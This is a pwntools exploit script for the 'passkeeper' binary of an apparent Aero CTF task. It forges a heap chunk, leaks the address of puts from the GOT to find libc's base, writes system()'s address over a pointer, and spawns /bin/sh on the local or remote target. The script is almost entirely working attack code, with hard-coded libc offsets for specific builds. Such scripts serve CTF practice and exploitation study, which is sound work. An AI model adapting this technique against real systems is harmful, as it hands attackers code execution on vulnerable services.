from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './passkeeper'
HOST = 'tasks.aeroctf.com'
PORT = 33039

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(["./ld-linux-x86-64.so.2", TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x1593])

def keep(word):
    r.sendlineafter('> ', '1')
    r.sendafter('password: ', word)
    
def delete(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('id: ', str(idx))

def show(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('id: ', str(idx))

def change(text): 
    r.sendlineafter('> ', '7')
    r.sendafter('secret: ', text)

name = '/bin/sh;'
name = name.ljust(0x30, 'A')
name += flat(0, 0x41)
r.sendlineafter('name: ', name)
r.sendlineafter('secret: ', p64(0xdeadbeef))


for i in range(16):
    keep('B')

change(p64(elf.got.puts))
show(16)
r.recvuntil('Value: ')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg("leak")
# base = leak - 0x83cc0
base = leak - 0x73f30
# system = base + 0x52fd0
system = base + 0x46ed0

dbg("base")

change(p64(0x404100))
delete(16)
keep(p64(system))

r.sendlineafter('> ', '6')
r.interactive()

